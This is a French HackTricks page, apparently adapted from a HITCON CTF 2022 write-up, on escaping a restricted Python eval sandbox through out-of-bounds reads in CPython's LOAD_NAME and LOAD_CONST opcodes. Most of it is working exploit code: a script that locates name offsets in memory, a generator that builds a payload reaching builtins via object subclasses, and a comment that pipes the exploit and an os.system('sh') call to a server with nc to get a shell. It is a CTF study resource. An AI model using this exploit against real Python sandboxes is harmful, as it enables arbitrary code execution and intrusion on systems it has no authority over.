# LOAD_NAME / LOAD_CONST opcode OOB Read

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Ces informations ont été extraites** [**de ce compte-rendu**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Nous pouvons utiliser la fonction de lecture OOB dans l'opcode LOAD_NAME / LOAD_CONST pour obtenir un symbole en mémoire. Cela signifie utiliser un astuce comme `(a, b, c, ... des centaines de symboles ..., __getattribute__) if [] else [].__getattribute__(...)` pour obtenir un symbole (tel qu'un nom de fonction) que vous souhaitez.

Ensuite, il suffit de concevoir votre exploit.

### Aperçu <a href="#overview-1" id="overview-1"></a>

Le code source est assez court, ne contient que 4 lignes !
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
### Lecture hors limites <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Comment se produit le plantage de segment ?

Commençons par un exemple simple, `[a, b, c]` pourrait être compilé en le bytecode suivant.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Mais que se passe-t-il si `co_names` devient un tuple vide ? L'opcode `LOAD_NAME 2` est toujours exécuté, et tente de lire la valeur à partir de cette adresse mémoire où elle aurait dû être initialement. Oui, c'est une fonctionnalité de lecture hors limites.

Le concept central de la solution est simple. Certains opcodes dans CPython, par exemple `LOAD_NAME` et `LOAD_CONST`, sont vulnérables (?) à la lecture hors limites.

Ils récupèrent un objet à l'index `oparg` du tuple `consts` ou `names` (c'est ce que `co_consts` et `co_names` sont nommés en interne). Nous pouvons nous référer au court extrait suivant sur `LOAD_CONST` pour voir ce que CPython fait lorsqu'il traite l'opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
De cette manière, nous pouvons utiliser la fonctionnalité OOB pour obtenir un "nom" à partir d'un décalage mémoire arbitraire. Pour être sûr du nom et de son décalage, il suffit de continuer à essayer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Et vous pourriez trouver quelque chose à environ oparg > 700. Vous pouvez également essayer d'utiliser gdb pour jeter un œil à la disposition de la mémoire bien sûr, mais je ne pense pas que ce serait plus facile?

### Génération de l'Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Une fois que nous avons récupéré ces décalages utiles pour les noms / constantes, comment _obtenir_ un nom / constante à partir de ce décalage et l'utiliser? Voici un truc pour vous:\
Supposons que nous puissions obtenir un nom `__getattribute__` à partir du décalage 5 (`LOAD_NAME 5`) avec `co_names=()`, il suffit de faire ce qui suit:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Remarquez qu'il n'est pas nécessaire de le nommer `__getattribute__`, vous pouvez le nommer avec un nom plus court ou plus bizarre

Vous pouvez comprendre la raison en visualisant simplement son bytecode :
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Notez que `LOAD_ATTR` récupère également le nom à partir de `co_names`. Python charge les noms à partir du même décalage si le nom est le même, donc le deuxième `__getattribute__` est toujours chargé à partir du décalage=5. En utilisant cette fonctionnalité, nous pouvons utiliser un nom arbitraire une fois que le nom est en mémoire à proximité.

Pour générer des nombres, cela devrait être trivial :

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Script d'Exploitation <a href="#exploit-script-1" id="exploit-script-1"></a>

Je n'ai pas utilisé de constantes en raison de la limite de longueur.

Tout d'abord, voici un script pour nous permettre de trouver ces décalages de noms.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Et ce qui suit est pour générer l'exploit Python réel.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Il fait essentiellement les choses suivantes, pour les chaînes que nous obtenons à partir de la méthode `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}
